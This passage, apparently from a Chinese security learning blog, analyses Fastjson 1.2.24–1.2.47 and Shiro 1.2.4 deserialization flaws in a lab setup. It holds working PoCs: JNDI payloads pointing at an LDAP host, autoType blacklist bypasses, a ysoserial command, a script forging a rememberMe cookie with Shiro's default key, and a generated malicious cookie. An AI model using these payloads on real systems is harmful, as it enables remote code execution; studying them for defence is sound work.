class="hljs-comment">//2.fastjson 加入User类解析:传入其他类解析后默认执行 set get类方法</span><br>        <span class="hljs-comment">// 在 1.2.25+ 之后默认关闭了 AutoType 功能。主动拒绝了 @type 自动类型反序列化。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">userStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson122.demos.web.User\&quot;,\&quot;age\&quot;:22,\&quot;name\&quot;:\&quot;xiaodi\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data2</span> <span class="hljs-operator">=</span> JSON.parseObject(userStr);<br>        System.out.println(data2);<br><br>        <span class="hljs-comment">//3.fastjson 加入执行命令解析:FastJson 支持 @type 语法对应类操作</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">testStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson001.demos.web.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data3</span> <span class="hljs-operator">=</span> JSON.parseObject(testStr);<br>        System.out.println(data3);<br><br>        <span class="hljs-comment">//4.加入Poc类解析:JdbcRowSetImpl类解析后执行setDataSourceName setAutoCommit方法</span><br>        <span class="hljs-comment">//注：控制 dataSourceName 值后调 setAutoCommit 触发 connect 里面的 lookup</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">pocStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://169.254.39.1:1389/rfkucd\&quot;, \&quot;autoCommit\&quot;:true&#125;\n&quot;</span>;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">data4</span> <span class="hljs-operator">=</span> JSON.parseObject(pocStr);<br>        System.out.println(data4);<br><br>        <span class="hljs-comment">//触发 fastjson 反序列化用到 JSON.parseObject() &amp; JSON.parse()</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="分析链："><a href="#分析链：" class="headerlink" title="分析链："></a>分析链：</h3><p>调试分析：</p><p>此处下断点调试</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091619576.png" alt="null"></p><p><code>parseObject</code> 方法调用 <code>parse</code> 方法解析字符串</p><p><code>parse(text)</code> 是 Fastjson 的底层解析方法。</p><p>它会根据字符串的内容返回不同的对象：</p><ul><li><p>如果是 <code>{...}</code> → 返回 <code>JSONObject</code></p></li><li><p>如果是 <code>[...]</code> → 返回 <code>JSONArray</code></p></li><li><p>如果是普通值 → 返回 <code>String</code>、<code>Number</code>、<code>Boolean</code> 等。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091620453.png" alt="null"></p><p><code>JSON.DEFAULT_TYPE_KEY</code> 是一个固定值 <code>@type</code>，一旦判断值为 <code>@type</code> ，就将其认为是类的限定，之后便尝试加载<code>com.sun.rowset.JdbcRowSetImpl</code> 类。即 <code>@type</code> &#x3D; <code>com.sun.rowset.JdbcRowSetImpl</code>，fastjson 会去加载这个类。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091623495.png" alt="null"></p><p>步入 <code>TypeUtils.loadClass</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091627769.png" alt="null"></p><p><code>config</code> 是 <code>ParserConfig</code> 对象，保存了各种类的反序列化器;<code>deserialze</code> 方法的三个参数：</p><ol><li><p><code>this</code> → 当前解析器（<code>DefaultJSONParser</code>），里面有 lexer、上下文等信息。</p></li><li><p><code>clazz</code> → 要生成的 Java 类。</p></li><li><p><code>fieldName</code> → 字段名（如果这是某个字段的值）。</p></li></ol><p>这个方法会根据 <code>clazz</code> 的结构，从 JSON 中取值，并用反射或类型转换来创建对象并赋值</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091628887.png" alt="null"></p><p>在执行反序列化的过程中，变量中出现了 <code>JdbcRowSetImpl</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091634392.png" alt="null"></p><p>经过漫长的跟踪，来到了关键点。。（对于一些不重要的判断可以跳过，追踪关键点）</p><p>这是反序列化RCE的触发点，<code>InitialContext</code> 是 JNDI（Java Naming and Directory Interface）的入口类，<code>lookup()</code> 会根据传入的地址去访问远程服务</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091639344.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091641791.png" alt="null"></p><h3 id="总结分析链："><a href="#总结分析链：" class="headerlink" title="总结分析链："></a>总结分析链：</h3><p>parseObject -&gt;  parse -&gt; key(@type) -&gt; TypeUtils.loadClass -&gt; ObjectDeserializer -&gt; JdbcRowSetImpl -&gt; connect -&gt; lookup</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091652348.png" alt="null"></p><p>结合 <strong>传入其他类，解析后默认执行 set get类方法</strong> 的结论，当走到 <code>JdbcRowSetImpl.class</code> 中触发了其中的set、get方法，而 <code>setAutoCommit</code> 中恰好有 <code>connect</code> 方法，触发执行了 <code>lookup</code> 方法，而 <code>lookup</code> 方法中 触发了 <code>getDataSourceName</code> ，所以 poc 构造的思路就有了：</p><ol><li><p><code>@type</code> : 告诉 Fastjson 将它反序列化成指定的 Java 类，即 “com.sun.rowset.JdbcRowSetImpl”</p></li><li><p><code>dataSourceName</code> : JDBC 连接的数据源，此处使用 <code>Java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot;</code></p></li><li><p><code>autoCommit</code> : 调用 <code>setAutoCommit(true)</code> ，触发逻辑</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://169.254.39.1:1389/rfkucd\&quot;, \&quot;autoCommit\&quot;:true&#125;<br>--&gt;<br>&#123;<br>  &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,<br>  &quot;dataSourceName&quot;: &quot;ldap://169.254.39.1:1389/rfkucd&quot;,<br>  &quot;autoCommit&quot;: true<br>&#125;<br></code></pre></td></tr></table></figure><p>这样就可以达到 <code>lookup</code> 访问远程服务的目的，造成了反序列化RCE漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091653730.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508091655152.png" alt="null"></p><p>当然，1.2.24 的漏洞在之后的版本已经被修复，默认不开启 autoType</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508100949058.png" alt="null"></p><h2 id="FastJson-1-2-25-1-2-47-CC链分析"><a href="#FastJson-1-2-25-1-2-47-CC链分析" class="headerlink" title="FastJson 1.2.25-1.2.47 CC链分析"></a>FastJson 1.2.25-1.2.47 CC链分析</h2><h3 id="1、开启-autoType"><a href="#1、开启-autoType" class="headerlink" title="1、开启 autoType"></a>1、开启 autoType</h3><h4 id="漏洞利用条件："><a href="#漏洞利用条件：" class="headerlink" title="漏洞利用条件："></a>漏洞利用条件：</h4><ol><li><p>开启 <code>AutoTypeSupport</code></p></li><li><p>加 <code>L</code> 和 <code>;</code></p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);<br>String testPoc = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://169.254.39.1:1389/5uppp0\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot;&#125;&quot;;<br>JSONObject test = JSON.parseObject(testPoc);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101014904.png" alt="null"></p><h4 id="POC-分析-链分析："><a href="#POC-分析-链分析：" class="headerlink" title="POC 分析&amp;链分析："></a>POC 分析&amp;链分析：</h4><p><code>JSONObject test = JSON.parseObject(testPoc);</code> 断点调试</p><p>判断 key &#x3D;&#x3D; @type</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101025365.png" alt="null"></p><p>步入 <code>checkAutoType</code>，<code>acceptList</code>白名单，这里的 <code>checkAutoType</code> 中<code>acceptList</code> 为空数组，不会匹配白名单，而是进入下方的黑名单</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101029937.png" alt="null"></p><p>可以看到先进入黑名单进行判断：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101033816.png" alt="null"></p><p>黑名单依次进行判断</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101040522.png" alt="null"></p><p>继续执行。这一步看到判断了 <code>className</code> 的开头和结尾如果分别为<code>L</code>和<code>;</code>，则进入<code>substring</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101044398.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101047885.png" alt="null"></p><p>在执行了 <code>substring</code> 之后，原本的<code>className = Lcom.sun.rowset.JdbcRowSetImpl;</code> 被替换成了 <code>newClassName = com.sun.rowset.JdbcRowSetImpl</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101047540.png" alt="null"></p><p>之后同 1.2.24 的反序列化链</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101054144.png" alt="null"></p><p><strong>接下来分析不开启</strong> <code>AutoTypeSupport</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101056293.png" alt="null"></p><p>来到白名单，<code>autoTypeSupport</code> 判断为 <code>false</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101057185.png" alt="null"></p><p>在这一步进行黑名单循环</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101100575.png" alt="null"></p><p>判断为异常，报错，结束</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101102069.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101103424.png" alt="null"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101103380.png" alt="null"></p><h4 id="总结分析链：-1"><a href="#总结分析链：-1" class="headerlink" title="总结分析链："></a>总结分析链：</h4><p>parseObject -&gt;  key(@type) -&gt; checkAutoType -&gt; denyList -&gt; substring -&gt; loadClass -&gt; newClassName &#x3D; com.sun.rowset.JdbcRowSetImpl</p><p>这些版本都是结合黑名单进行构造绕过，比如 加 <code>L</code> 和 <code>;</code>、加 <code>LL</code> 和 <code>;;</code>、加 <code>[</code> 等等，关键点要开启 <code>AutoTypeSupport</code></p><blockquote><p>从1.2.41说起。在checkAutotype()函数中，会先检查传入的@type的值是否是在黑名单里，如果要反序列化的类不在黑名单中，那</p><p>么才会对其进行反序列化。问题来了，在反序列化前，会经过loadClass()函数进行处理，其中一个处理方法是：在加载类的时候会去</p><p>掉className前后的L和;。所以，如果我们传入Lcom.sun.rowset.JdbcRowSetImpl;，在经过黑白名单后，在加载类时会去掉前后的</p><p>L和;，就变成了com.sun.rowset.JdbcRowSetImpl，反序列化了恶意类。</p><p>更新了1.2.42，方法是先判断反序列化目标类的类名前后是不是<code>L</code>和<code>;</code>，如果是，那么先去掉L和;，再进行黑白名单校验（偷懒</p><p>qaq）。关于1.2.42绕过非常简单，只需要双写L和;，就可以在第一步去掉L和;后，与1.2.41相同。</p><p>更新也非常随意，在1.2.43中，黑白名单判断前，又增加了一个是否以LL开头的判断，如果以LL开头，那么就直接抛异常，非常随意</p><p>解决了双写的问题。但是除了L和;，FastJson在加载类的时候，不只对L和;这样的类进行特殊处理，[也对特殊处理了，所以，同样的</p><p>方式在前面添加[绕过了1.2.43及之前的补丁。</p><p>在1.2.44中，黑客们烦不烦，来了个狠的：只要你以<code>[</code>开头或者<code>;</code>结尾，我直接抛一个异常。如此，终于解决了缠绵多个版本的漏洞。</p></blockquote><h3 id="2、checkAutotype绕过"><a href="#2、checkAutotype绕过" class="headerlink" title="2、checkAutotype绕过"></a>2、checkAutotype绕过</h3><p>FastJson有一个全局缓存机制：在解析json数据前会先加载相关配置，调用 addBaseClassMappings() 和 loadClass() 函数将一些基础类和第三方库存放到 mappings 中（mappings 是 ConcurrentMap 类，所以我们在一次连接中传入两个键值 a 和 b ，之后在解析时，如果没有开启 autotype，会从 mappings 或 deserializers.findClass() 函数中获取反序列化的对应类，如果有，则直接返回绕过了黑名单。利用的是 java.lang.Class 类，其反序列化处理类 MiscCodec 类可以将任意类加载到 mappings 中，实现了目标。</p><p>第一步利用 java.lang.Class 将恶意类加载到 mappings 中；</p><p>第二步从在 checkAutoType 内部，没有开启 autotype ，直接从 mappings 中获取 mappings 中取出恶意类并绕过黑名单进行了反序列化。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508101120042.png" alt="null"></p><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">testStr=&#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>        <span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;b&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br><span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://169.254.39.1:1389/is9aig&quot;</span>,<br>        <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shiro反序列化</title>
    <link href="/2025/10/21/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/10/21/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Shiro反序列化"><a href="#Shiro反序列化" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h1><h2 id="Shiro反序列化-1"><a href="#Shiro反序列化-1" class="headerlink" title="Shiro反序列化"></a>Shiro反序列化</h2><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p><a href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记一（原理篇）</a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>直接从github上clone代码到本地。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">git clone https://github.com/apache/shiro.git<br>cd shiro<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure><p>修改 pml.xml（路径为 \shiro\samples\web\pom.xml）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-comment">&lt;!-- 添加 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>之后 maven 搭建，配置 tomcat 环境</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505867.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505841.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510211505868.png" alt="img"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞分析具体已经在 Java-sec-code 分析过了，就不再重复了：</p><p><strong>逻辑总结：</strong></p><p>当获取用户请求时，大致的关键处理过程如下：</p><ol><li><p>获取Cookie中rememberMe的值</p></li><li><p>对rememberMe进行Base64解码</p></li><li><p>使用AES进行解密</p></li><li><p>对解密的值进行反序列化</p></li></ol><p>由于AES加密的Key是硬编码的默认Key，因此攻击者可通过使用默认的Key对恶意构造的序列化数据进行加密，当</p><p>CookieRememberMeManager 对恶意的 rememberMe 进行以上过程处理时，最终会对恶意数据进行反序列化，从而导致反序列化漏洞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(value = &quot;/shiro/deserialize&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">shiro_deserialize</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse res)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> getCookie(req, Constants.REMEMBER_ME_COOKIE);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == cookie) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No rememberMe cookie. Right?&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rememberMe</span> <span class="hljs-operator">=</span> cookie.getValue();<br>        <span class="hljs-type">byte</span>[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);<br>        <span class="hljs-type">byte</span>[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(aesDecrypt);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bytes);<br>        in.readObject();<br>        in.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        <span class="hljs-keyword">if</span> (CookieUtils.addCookie(res, <span class="hljs-string">&quot;rememberMe&quot;</span>, DELETE_ME))&#123;<br>            log.error(e.getMessage());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;RememberMe cookie decrypt error. Set deleteMe cookie success.&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Shiro deserialize&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Shiro  <code>rememberMe</code> 功能用于“记住登录状态”。它的设计逻辑是：</p><p>用户勾选“记住我”登录后，Shiro 把用户的认证信息<strong>序列化为字节流</strong>，用一个固定密钥（默认是 <code>kPH+bIxk5D2deZiIxcaaaA==</code>）用 AES 加密，Base64 编码后作为 <code>rememberMe</code> Cookie 发送给浏览器。当浏览器下次请求时，Shiro：读取 <code>rememberMe</code> Cookie，用同样的密钥进行解密，然后<strong>直接反序列化</strong>出用户对象，只要攻击者能控制 <code>rememberMe</code> Cookie 内容，<strong>就能构造恶意对象反序列化，从而执行任意代码。</strong></p><p><strong>漏洞利用：</strong></p><p>生成恶意序列化数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">java -jar ysoserial.jar CommonsBeanutils1 &quot;calc.exe&quot; &gt; payload.bin<br></code></pre></td></tr></table></figure><p>加密 Payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Shiro 默认密钥</span><br>key = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br><br><span class="hljs-comment"># 读取 payload</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;D:\\CTF-Tools\\ysoserial-master\\target\\payload.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    payload = f.read()<br><br><span class="hljs-comment"># 补齐为 16 的倍数 (PKCS5Padding)</span><br>pad = <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(payload) % <span class="hljs-number">16</span><br>payload += <span class="hljs-built_in">bytes</span>([pad] * pad)<br><br><span class="hljs-comment"># AES-CBC 加密 (IV 随机生成)</span><br>iv = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">16</span>  <span class="hljs-comment"># 实际攻击需随机 IV</span><br>cipher = AES.new(key, AES.MODE_CBC, iv)<br>encrypted = cipher.encrypt(payload)<br><br><span class="hljs-comment"># Base64 编码</span><br>rememberMe = base64.b64encode(iv + encrypted).decode()  <span class="hljs-comment"># Shiro 格式: IV+密文</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;恶意 Cookie:&quot;</span>, rememberMe)<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">恶意 Cookie: <br>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